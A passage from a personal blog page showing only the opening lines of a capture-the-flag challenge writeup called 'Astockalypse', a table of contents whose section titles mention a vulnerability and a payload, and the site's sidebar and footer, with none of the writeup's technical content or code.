CSIT, and the DIS. This year, I had the opportunity to author a challenge for the data science category, and Astockalypse was what I came up with. At the end of this writeup are my thoughts before, during and after challenge creation, and how I could’ve improved from a creative and a technical standpoint. Challenge 📘 Challenge description: One of your agents has found a proprietary...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Iscara</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iscaraca" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/isaaccjd/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin-in" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge"><span class="toc-number">1.</span> <span class="toc-text">Challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup"><span class="toc-number">2.</span> <span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crafting-a-plan"><span class="toc-number">2.1.</span> <span class="toc-text">Crafting a plan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-vulnerability"><span class="toc-number">2.2.</span> <span class="toc-text">Finding the vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-the-HTTP-Protocol-Works"><span class="toc-number">2.3.</span> <span class="toc-text">How the HTTP Protocol Works</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Constructing-our-Payload"><span class="toc-number">2.4.</span> <span class="toc-text">Constructing our Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Possible-Pitfall"><span class="toc-number">2.5.</span> <span class="toc-text">One Possible Pitfall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Solution"><span class="toc-number">2.6.</span> <span class="toc-text">Final Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thoughts"><span class="toc-number">3.</span> <span class="toc-text">Thoughts</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-color: #0e1111;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Iscara</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="What are you looking for?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>